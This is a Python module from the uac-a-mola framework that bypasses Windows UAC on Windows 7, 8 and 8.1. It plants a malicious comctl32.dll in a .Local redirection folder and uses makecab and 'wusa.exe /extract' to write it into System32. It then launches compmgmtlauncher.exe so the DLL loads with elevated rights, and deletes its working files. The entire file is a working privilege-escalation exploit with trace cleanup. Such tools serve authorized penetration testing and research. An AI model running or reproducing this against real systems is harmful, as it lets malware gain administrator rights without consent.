# This file is part of uac-a-mola
# Copyright (C) Pablo Gonzalez (pablo@11paths.com)
#
# DESCRIPTION
# This module is used for copy a DLL in privilege path (wusa method win7/8/8.1)


from module import Module
from support.procmonXMLparser import ProcmonXmlParser
import support.procmonXMLfilter as Filter
import time
import subprocess
import psutil
import copy
import os
from termcolor import colored


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "Copy DLL with wusa.exe",
                       "Description": "It's used for copy a DLL in privilege path (wusa method win7/8/8.1)",
                       "Author": "Pablo Gonzalez"}

        # -----------name-----default_value--description
        options = {"binary": ["compmgmtlauncher.exe", "Path to the vulnerable binary", True],
                   "malicious_dll": ["C:\Users\ieuser\Desktop\uac-a-mola\uacamola\payloads\comctl32\comctl32.dll", "Path to a malicious dll", True],
                   "destination_path": ["C:\Windows\System32", "Destination path", True],
                   "name_folder": ["x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2", "Name folder", True ],
                   "name_dll": ["comctl32.dll","name of DLL",True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        binary = self.args['binary']
        payload = self.args['malicious_dll']
        destination = self.args['destination_path']
        name_dll = self.args['name_dll']
        folder = self.args['name_folder']

        self.create_path_and_copy_dll(binary,name_dll,payload,folder)
        self.create_ddf_file(binary,name_dll,folder)
        self.make_cab(binary)
        self.run_wusa(destination)
        subprocess.check_call(["powershell", "-C", binary])
        self.delete_path(binary)

    def create_path_and_copy_dll(self, binary, name, malicious, folder):
        self.print_info("creating path...\n")
        path = binary + ".Local\\" + folder + "\\"
        subprocess.check_call(["powershell", "-C", "mkdir", path, ">", "$null"])
        self.print_ok("done\n")
        self.print_info("copying dll in path...\n")
        subprocess.check_call(["powershell", "-C", "copy", malicious, path, ">", "$null"])
        self.print_ok("done\n")

    def create_ddf_file(self, binary, name_dll, folder):
        self.print_info("creating DDF file...\n")
        ddf = ".OPTION EXPLICIT\r\n\r\n.Set CabinetNameTemplate=mycab.CAB\r\n.Set DiskDirectoryTemplate=.\r\n\r\n.Set Cabinet=on\n.Set Compress=on\n.Set DestinationDir=" + binary + ".Local\\" + folder + "\r\n \"" + binary + ".Local\\" + folder + "\\" + name_dll +"\""
        self.print_ok("done\n")
        f=open("proof.ddf","w")
        f.write(ddf)
        f.close()

    def make_cab(self,binary):
        self.print_info("creating CAB file...\n")
        subprocess.check_call(["powershell", "-C", "makecab.exe", "/f", "proof.ddf", ">", "$null"])
        self.print_ok("done\n")

    def run_wusa(self,dest):
        path = os.getcwd()
        cab = path + "\\mycab.cab"
        extract = "/extract:" + dest
        self.print_info("launch wusa.exe /extract\n")
        subprocess.check_call(["powershell", "-C", "wusa.exe", cab, extract, ">", "$null"])
        self.print_ok("done! got root? :D\n")

    def delete_path(self,binary):
        self.print_info("removing path...\n")
        path = binary + ".Local"
        subprocess.check_call(["powershell", "-C", "rmdir", "-Recurse", path, ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "proof.ddf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.inf", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "setup.rpt", ">", "$null"])
        subprocess.check_call(["powershell", "-C", "rm", "-Force", "mycab.CAB", ">", "$null"])
        self.print_ok("done\n")
